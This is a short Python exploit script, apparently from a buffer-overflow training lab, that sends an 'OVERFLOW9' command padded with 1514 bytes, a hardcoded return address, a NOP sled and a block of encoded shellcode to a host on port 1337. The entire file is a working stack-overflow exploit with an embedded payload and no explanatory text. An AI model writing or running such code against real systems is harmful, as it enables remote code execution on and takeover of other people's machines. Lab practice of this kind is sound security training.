#!/usr/bin/env python3

import socket

ip = "10.10.5.108"
port = 1337

prefix = "OVERFLOW9 "
offset = 1514
overflow = "A" * offset
retn = "\xf7\x11\x50\x62" # 625011f7
padding = "\x90" * 16
payload = ("\xdb\xd6\xbd\x7c\xbe\xf4\xd4\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x6e\x17\x03\x6e\x17\x83\x92\x42\x16\x21\x96\x53\x55"
"\xca\x66\xa4\x3a\x42\x83\x95\x7a\x30\xc0\x86\x4a\x32\x84\x2a"
"\x20\x16\x3c\xb8\x44\xbf\x33\x09\xe2\x99\x7a\x8a\x5f\xd9\x1d"
"\x08\xa2\x0e\xfd\x31\x6d\x43\xfc\x76\x90\xae\xac\x2f\xde\x1d"
"\x40\x5b\xaa\x9d\xeb\x17\x3a\xa6\x08\xef\x3d\x87\x9f\x7b\x64"
"\x07\x1e\xaf\x1c\x0e\x38\xac\x19\xd8\xb3\x06\xd5\xdb\x15\x57"
"\x16\x77\x58\x57\xe5\x89\x9d\x50\x16\xfc\xd7\xa2\xab\x07\x2c"
"\xd8\x77\x8d\xb6\x7a\xf3\x35\x12\x7a\xd0\xa0\xd1\x70\x9d\xa7"
"\xbd\x94\x20\x6b\xb6\xa1\xa9\x8a\x18\x20\xe9\xa8\xbc\x68\xa9"
"\xd1\xe5\xd4\x1c\xed\xf5\xb6\xc1\x4b\x7e\x5a\x15\xe6\xdd\x33"
"\xda\xcb\xdd\xc3\x74\x5b\xae\xf1\xdb\xf7\x38\xba\x94\xd1\xbf"
"\xbd\x8e\xa6\x2f\x40\x31\xd7\x66\x87\x65\x87\x10\x2e\x06\x4c"
"\xe0\xcf\xd3\xc3\xb0\x7f\x8c\xa3\x60\xc0\x7c\x4c\x6a\xcf\xa3"
"\x6c\x95\x05\xcc\x07\x6c\xce\xf9\xd3\x46\xd6\x96\xd9\x96\xf7"
"\x3a\x57\x70\x9d\xd2\x31\x2b\x0a\x4a\x18\xa7\xab\x93\xb6\xc2"
"\xec\x18\x35\x33\xa2\xe8\x30\x27\x53\x19\x0f\x15\xf2\x26\xa5"
"\x31\x98\xb5\x22\xc1\xd7\xa5\xfc\x96\xb0\x18\xf5\x72\x2d\x02"
"\xaf\x60\xac\xd2\x88\x20\x6b\x27\x16\xa9\xfe\x13\x3c\xb9\xc6"
"\x9c\x78\xed\x96\xca\xd6\x5b\x51\xa5\x98\x35\x0b\x1a\x73\xd1"
"\xca\x50\x44\xa7\xd2\xbc\x32\x47\x62\x69\x03\x78\x4b\xfd\x83"
"\x01\xb1\x9d\x6c\xd8\x71\xbd\x8e\xc8\x8f\x56\x17\x99\x2d\x3b"
"\xa8\x74\x71\x42\x2b\x7c\x0a\xb1\x33\xf5\x0f\xfd\xf3\xe6\x7d"
"\x6e\x96\x08\xd1\x8f\xb3")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")